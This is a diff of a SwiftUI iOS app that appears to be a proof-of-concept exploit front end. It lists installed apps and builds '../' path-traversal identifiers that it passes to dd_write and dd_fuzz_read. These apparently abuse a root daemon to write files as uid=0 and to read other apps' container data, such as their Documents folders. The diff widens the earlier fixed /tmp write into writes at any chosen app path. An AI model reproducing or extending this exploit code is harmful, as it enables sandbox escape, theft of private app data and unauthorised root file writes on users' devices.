@@ -1,31 +1,31 @@
 import SwiftUI
 
 struct AppEntry: Identifiable {
-    let id: String       // bundleId
+    let id: String
     let name: String
     let dataPath: String
     let bundlePath: String
+
+    var containerPath: String { dataPath.isEmpty ? bundlePath : dataPath }
 }
 
 struct ContentView: View {
-    @State private var apps: [AppEntry]       = []
+    @State private var apps:       [AppEntry] = []
     @State private var selectedId: String?    = nil
     @State private var subPath                = "Documents"
+    @State private var searchText             = ""
     @State private var running                = false
     @State private var showAlert              = false
     @State private var alertTitle             = ""
     @State private var alertMessage           = ""
-    @State private var searchText             = ""
+    @State private var loading                = true
 
-    private var selectedApp: AppEntry? {
-        apps.first { $0.id == selectedId }
-    }
+    private var selected: AppEntry? { apps.first { $0.id == selectedId } }
 
-    private var readTarget: String {
-        guard let app = selectedApp else { return "" }
-        let base = app.dataPath.isEmpty ? app.bundlePath : app.dataPath
-        let sub  = subPath.trimmingCharacters(in: CharacterSet(charactersIn: "/"))
-        return sub.isEmpty ? base : "\(base)/\(sub)"
+    private var target: String {
+        guard let app = selected else { return "" }
+        let sub = subPath.trimmingCharacters(in: CharacterSet(charactersIn: "/"))
+        return sub.isEmpty ? app.containerPath : "\(app.containerPath)/\(sub)"
     }
 
     private var filtered: [AppEntry] {
@@ -39,90 +39,82 @@ struct ContentView: View {
     var body: some View {
         VStack(spacing: 0) {
 
-            // ── Header ─────────────────────────────────────────────
-            VStack(spacing: 12) {
-                Text("Hello World").font(.largeTitle)
-
-                Button("OK Bommer  (write PoC)") { runWrite() }
-                    .buttonStyle(.borderedProminent)
-                    .disabled(running)
+            // ── Search bar ─────────────────────────────────────────
+            HStack {
+                Image(systemName: "magnifyingglass").foregroundStyle(.secondary)
+                TextField("Search apps…", text: $searchText)
+                    .autocorrectionDisabled()
+                    .textInputAutocapitalization(.never)
+                if loading { ProgressView().scaleEffect(0.7) }
             }
-            .padding()
-
-            Divider()
+            .padding(8)
+            .background(Color(.systemGray6))
+            .clipShape(RoundedRectangle(cornerRadius: 10))
+            .padding(.horizontal)
+            .padding(.top, 12)
 
             // ── App list ───────────────────────────────────────────
-            VStack(spacing: 0) {
+            List(filtered) { app in
                 HStack {
-                    Text("Fuzz Read — select target app")
-                        .font(.headline)
-                    Spacer()
-                    if apps.isEmpty {
-                        ProgressView().scaleEffect(0.7)
-                    }
-                }
-                .padding(.horizontal)
-                .padding(.top, 8)
-
-                TextField("Search…", text: $searchText)
-                    .textFieldStyle(.roundedBorder)
-                    .padding(.horizontal)
-                    .padding(.vertical, 4)
-
-                List(filtered) { app in
                     VStack(alignment: .leading, spacing: 2) {
-                        Text(app.name)
-                            .font(.body)
-                        Text(app.id)
-                            .font(.caption)
-                            .foregroundStyle(.secondary)
+                        Text(app.name).font(.body)
+                        Text(app.id).font(.caption).foregroundStyle(.secondary)
                     }
-                    .contentShape(Rectangle())
-                    .listRowBackground(
-                        selectedId == app.id
-                            ? Color.accentColor.opacity(0.15)
-                            : Color.clear
-                    )
-                    .onTapGesture { selectedId = app.id }
+                    Spacer()
+                    if selectedId == app.id {
+                        Image(systemName: "checkmark")
+                            .foregroundStyle(.accentColor)
+                    }
                 }
-                .listStyle(.plain)
+                .contentShape(Rectangle())
+                .listRowBackground(
+                    selectedId == app.id
+                        ? Color.accentColor.opacity(0.12)
+                        : Color.clear
+                )
+                .onTapGesture {
+                    selectedId = (selectedId == app.id) ? nil : app.id
+                }
             }
+            .listStyle(.plain)
 
-            Divider()
-
-            // ── Read controls ──────────────────────────────────────
-            VStack(spacing: 8) {
-                if let app = selectedApp {
+            // ── Bottom panel (shown when app selected) ─────────────
+            if let app = selected {
+                Divider()
+                VStack(spacing: 10) {
+                    // Path display + sub-path editor
                     HStack(spacing: 4) {
-                        Text(app.dataPath.isEmpty ? app.bundlePath : app.dataPath)
+                        Text(app.containerPath)
                             .font(.system(.caption2, design: .monospaced))
                             .foregroundStyle(.secondary)
                             .lineLimit(1)
                             .truncationMode(.middle)
                         Text("/")
-                            .foregroundStyle(.secondary)
+                            .foregroundStyle(.tertiary)
                         TextField("sub/path", text: $subPath)
                             .font(.system(.caption2, design: .monospaced))
-                            .frame(width: 130)
+                            .frame(minWidth: 80, maxWidth: 160)
                             .textFieldStyle(.roundedBorder)
                             .autocorrectionDisabled()
                             .textInputAutocapitalization(.never)
                     }
                     .padding(.horizontal)
-                } else {
-                    Text("Select an app above")
-                        .font(.caption)
-                        .foregroundStyle(.tertiary)
-                }
 
-                HStack(spacing: 16) {
-                    Button("Fuzz Read") { runFuzzRead() }
-                        .buttonStyle(.bordered)
-                        .disabled(running || selectedApp == nil)
+                    // Action buttons
+                    HStack(spacing: 16) {
+                        Button("OK Bommer") { runWrite(app: app) }
+                            .buttonStyle(.borderedProminent)
+                            .disabled(running)
 
-                    if running { ProgressView() }
+                        Button("Fuzz Read") { runFuzzRead(app: app) }
+                            .buttonStyle(.bordered)
+                            .disabled(running)
+
+                        if running { ProgressView() }
+                    }
+                    .padding(.bottom, 16)
                 }
-                .padding(.bottom, 12)
+                .background(Color(.systemBackground))
             }
         }
         .alert(alertTitle, isPresented: $showAlert) {
@@ -133,47 +125,46 @@ struct ContentView: View {
         .onAppear { loadApps() }
     }
 
-    // MARK: - Write
+    // MARK: - Write (OK Bommer)
 
-    private func runWrite() {
+    private func runWrite(app: AppEntry) {
         running = true
+        let dest = target
         Task.detached {
-            let ts   = Int(Date().timeIntervalSince1970)
-            let name = "poc_\(ts)"
-            let tgt  = "/private/tmp/\(name)"
-            let ident = "../../../../../../../private/tmp/\(name)"
-            let rc   = dd_write(ident, tgt)
+            // 9 ../ levels → guaranteed to reach / from any daemon working dir
+            let ident = "../../../../../../../../../../.." + dest
+            // Confirm file appeared at dest
+            let rc = dd_write(ident, dest)
             await finish(
                 title:   rc == 0 ? "Write OK" : "Write Failed",
-                message: rc == 0 ? "uid=0 file at \(tgt)" : "dd_write → \(rc)"
+                message: rc == 0
+                    ? "uid=0 file at:\n\(dest)"
+                    : "dd_write → \(rc)\ntarget: \(dest)"
             )
         }
     }
 
     // MARK: - Fuzz Read
 
-    private func runFuzzRead() {
-        guard let app = selectedApp else { return }
+    private func runFuzzRead(app: AppEntry) {
         running = true
-        let target = readTarget
+        let dest = target
         Task.detached {
-            // 9 levels of ../ guarantees reaching / from any daemon working dir
-            let traversal = "../../../../../../../../../../.." + target
-            let bufSize   = 8192
-            var buf       = [CChar](repeating: 0, count: bufSize)
-            var outLen    = 0
+            let ident   = "../../../../../../../../../../.." + dest
+            let bufSize = 8192
+            var buf     = [CChar](repeating: 0, count: bufSize)
+            var outLen  = 0
             var cmd: Int32 = -1
 
-            let rc = dd_fuzz_read(traversal, &buf, bufSize, &outLen, &cmd)
+            let rc = dd_fuzz_read(ident, &buf, bufSize, &outLen, &cmd)
 
-            let appLabel = "\(app.name) (\(app.id))"
             await finish(
-                title:   rc == 0 ? "Read OK — cmd \(cmd)" : "Read Failed",
+                title:   rc == 0 ? "Read OK  (cmd \(cmd))" : "Read Failed",
                 message: rc == 0
-                    ? "[\(appLabel)]\n\(target)\n\n"
+                    ? "\(app.name)\n\(dest)\n\n"
                       + (String(bytes: buf.prefix(outLen).map { UInt8(bitPattern: $0) },
                                 encoding: .utf8) ?? "(non-UTF8, \(outLen) bytes)")
-                    : "No command returned data.\nTarget: \(target)"
+                    : "No command returned data.\n\(dest)"
             )
         }
     }
@@ -181,18 +172,24 @@ struct ContentView: View {
     // MARK: - Load apps
 
     private func loadApps() {
+        loading = true
         Task.detached {
-            let raw = dd_installed_apps()
-            let list: [AppEntry] = (raw as? [[String: String]] ?? []).compactMap { d in
-                guard let bid = d["bundleId"], !bid.isEmpty else { return nil }
-                return AppEntry(
-                    id:          bid,
-                    name:        d["name"]        ?? bid,
-                    dataPath:    d["dataPath"]    ?? "",
-                    bundlePath:  d["bundlePath"]  ?? ""
-                )
+            let raw  = dd_installed_apps()
+            var list = [AppEntry]()
+            for item in raw {
+                guard let d   = item as? [String: Any],
+                      let bid = d["bundleId"] as? String, !bid.isEmpty else { continue }
+                list.append(AppEntry(
+                    id:         bid,
+                    name:       (d["name"]        as? String) ?? bid,
+                    dataPath:   (d["dataPath"]    as? String) ?? "",
+                    bundlePath: (d["bundlePath"]  as? String) ?? ""
+                ))
             }
-            await MainActor.run { apps = list }
+            await MainActor.run {
+                apps    = list
+                loading = false
+            }
         }
     }
 
